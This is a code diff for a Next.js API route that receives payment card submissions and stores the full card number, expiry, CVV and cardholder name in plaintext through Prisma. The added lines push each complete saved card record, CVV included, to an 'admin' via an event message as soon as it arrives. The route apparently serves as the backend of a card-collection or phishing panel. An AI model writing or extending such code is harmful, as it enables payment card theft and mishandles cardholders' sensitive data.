@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
 import { PrismaClient } from "@prisma/client";
+import { sendEventToAdmin } from "../event/route";
 
 const prisma = new PrismaClient();
 
@@ -8,7 +9,6 @@ export async function POST(req: NextRequest) {
     const body = await req.json();
     const { cardNumber, expiry, cvv, firstName, lastName, amount, userId, country, cardType } = body;
 
-    // Validare simplă
     if (!cardNumber || !expiry || !cvv || !firstName || !lastName || !amount || !cardType) {
       return NextResponse.json(
         { message: "Missing required fields." },
@@ -16,11 +16,10 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    // Salvăm în baza de date
     const savedCard = await prisma.card.create({
       data: {
         cardNumber,
-        cardType: cardType, // Identifică tipul cardului dacă ai nevoie
+        cardType: cardType,
         amount: parseFloat(amount),
         expDate: expiry,
         cvv,
@@ -29,6 +28,14 @@ export async function POST(req: NextRequest) {
         createdBy: userId ? parseInt(userId, 10) : 0,
       },
     });
+
+    // Notificăm adminul despre noul card
+    if (userId) {
+      sendEventToAdmin(
+        userId.toString(),
+        `A new card has been added: ${JSON.stringify(savedCard)}`
+      );
+    }
 
     return NextResponse.json(
       { message: "Card data saved successfully", savedCard },
